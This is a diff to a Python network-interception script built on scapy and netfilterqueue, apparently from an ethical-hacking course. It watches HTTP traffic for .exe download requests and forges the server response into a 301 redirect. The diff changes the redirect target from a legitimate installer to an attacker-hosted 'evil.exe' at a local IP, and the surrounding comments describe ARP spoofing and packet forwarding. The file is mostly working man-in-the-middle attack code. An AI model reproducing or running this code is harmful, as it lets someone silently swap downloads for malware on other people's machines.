@@ -2,28 +2,33 @@
 
 import argparse
 import netfilterqueue
-from scapy.all import *
+import scapy.all as scapy
+
+list_ack = []
 
 def do_packet_process(packet):
     ## Referenced from dns-spoofer
-    obj_packet_scapy = IP(packet.get_payload())
-    if obj_packet_scapy.haslayer(Raw):
+    obj_packet_scapy = scapy.IP(packet.get_payload())
+    if obj_packet_scapy.haslayer(scapy.Raw) and obj_packet_scapy.haslayer(scapy.TCP):
         ## HTTP Request/Response Criteria
         ## If Source Port (sport) is 42846 (tcp/udp) and Destination Port (dport) is http (80) => Request
         ## If Source Port (sport) is http (80) and Destination Port (dport) is 42846 (tcp/udp) => Response
         ## Check if TCP dport (Destination Port) is HTTP, hence request
-        if obj_packet_scapy[TCP].dport == 80:
-            # print("ℹ️  HTTP Request")
-            if ".exe" in obj_packet_scapy[Raw].load:
-                print("🔔 Executable (.exe) Request")
+        
+        if obj_packet_scapy[scapy.TCP].dport == 80:
+            print("ℹ️  HTTP Request")
+            if ".exe" in obj_packet_scapy[scapy.Raw].load.decode():
+                print("🔔 Executable File (.exe) Request")
                 ## Adds the ack field in the list
-                list_ack.append(obj_packet_scapy[TCP].ack)
+                list_ack.append(obj_packet_scapy[scapy.TCP].ack)
                 print(obj_packet_scapy.show())
+                print(list_ack)
         ## Check if TCP dport (Destination Port) is HTTP, hence response 
-        elif obj_packet_scapy[TCP].sport == 80:
-            # print("ℹ️  HTTP Response")
-            if obj_packet_scapy[TCP].seq in list_ack:
-                list_ack.remove(obj_packet_scapy[TCP].seq)
+        elif obj_packet_scapy[scapy.TCP].sport == 80:
+            print("ℹ️  HTTP Response")
+            
+            if obj_packet_scapy[scapy.TCP].seq in list_ack:
+                list_ack.remove(obj_packet_scapy[scapy.TCP].seq)
                 print("ℹ️ Replacing File")
                 ## Set a customized 301 Payload. Template was based from the references
                 ## In linux: /var/www/html/<dir>/<Evil File.exe> => http://<Attacker IP>//<dir>/<Evil File.exe>
@@ -31,20 +36,22 @@ def do_packet_process(packet):
                 ## Reference https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
                 ## Reference https://en.wikipedia.org/wiki/HTTP_301
                 ## \n\n suffix was added to ensure extra characters will not interfere with the process
-                obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
+                # obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: https://www.7-zip.org/a/7z2301-x64.exe\n\n")
+                obj_packet_mod = do_payload_set(obj_packet_scapy, "HTTP/1.1 301 Moved Permanently" + "\n" + "Location: http://192.168.1.6/evil.exe\n\n")
                 packet.set_payload(bytes(obj_packet_mod))
+                
+                
     ## Let the Python program allow/block the packets to the target (Only 1 is allowed)
     packet.accept()
     # packet.drop()
 
 def do_payload_set(obj_packet, str_payload):
     # print(packet.show())
-    obj_packet[Raw].load = str_payload
+    obj_packet[scapy.Raw].load = str_payload
     ## Deleting Checksums and length properties to let network refresh values and bypass checking
-    del obj_packet[IP].chksum
-    del obj_packet[IP].len
-    del obj_packet[TCP].chksum
-    del obj_packet[TCP].len
+    del obj_packet[scapy.IP].chksum
+    del obj_packet[scapy.IP].len
+    del obj_packet[scapy.TCP].chksum
     return obj_packet
 
 def get_arguments():
@@ -53,8 +60,8 @@ def get_arguments():
         description='Intercepts Payload via MITM + DNS Poisoning.',
         epilog='Not yet tested'
     )
-    obj_parser.add_argument("-d", "--domain-name", dest="dns", help="DNS (E.g. www.bing.com)", required=True)
-    obj_parser.add_argument("-p", "--payload", dest="payload", help="IPv4 Rerouting Address (E.g. 192.168.1.6)", required=True)
+    obj_parser.add_argument("-d", "--domain-name", dest="dns", help="DNS (E.g. www.bing.com)", required=False)
+    obj_parser.add_argument("-p", "--payload", dest="payload", help="IPv4 Rerouting Address (E.g. 192.168.1.6)", required=False)
     options = obj_parser.parse_args()
     return options
 
@@ -72,12 +79,10 @@ def get_arguments():
 ## Start arp-spoofer
 
 ## Start Packet Forwarding
-## Linux: echo 1 > /prod/sys/net/ipv4/ip_forward
+## Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
 
 ## Test a Download Website (HTTP)
 ## E.g. http://www.speedbit.com/
-
-list_ack = []
 
 ## Try-Catch was used to enable keyboard exception handling
 try:
